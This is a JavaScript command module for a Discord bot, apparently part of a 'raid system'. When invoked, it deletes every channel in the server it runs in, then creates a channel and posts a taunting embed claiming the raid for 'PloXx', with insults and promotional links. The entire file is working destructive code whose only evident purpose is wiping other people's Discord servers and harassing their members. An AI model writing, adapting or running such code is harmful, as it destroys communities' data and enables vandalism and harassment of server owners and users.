const chalk = require("chalk");
const Discord = require("discord.js")
const { Client, MessageEmbed } = require('discord.js');

module.exports = {
    name: 'on',
    description: 'deleter command',
    execute(message, args) {
        message.delete()
        console.log((chalk.red(`Canales borrados en ${message.guild.name}`)));
        message.guild.channels.cache.forEach(channel => channel.delete());
        message.guild.channels.create('PloXxWasHere', {
            type: 'text'
        }).then(channel => {
            var embed = new Discord.MessageEmbed()
            .setTitle('Raid By 倍PloXx倍')
            .setDescription('THIS SERVER HAS BEEN FVCKED BY PloXx RAID SYSTEM')
            .addField('JODETE :)', 'https://lloreria.es')
            .addField('YouTube', 'https://www.youtube.com/channel/UCllG9J2KuYBoi0cHk9-VqyQ')
            .setImage('https://cdn.discordapp.com/attachments/857710148289298462/857710300797861968/OIP_3.jpg')
            channel.send(embed)
        })
    }
};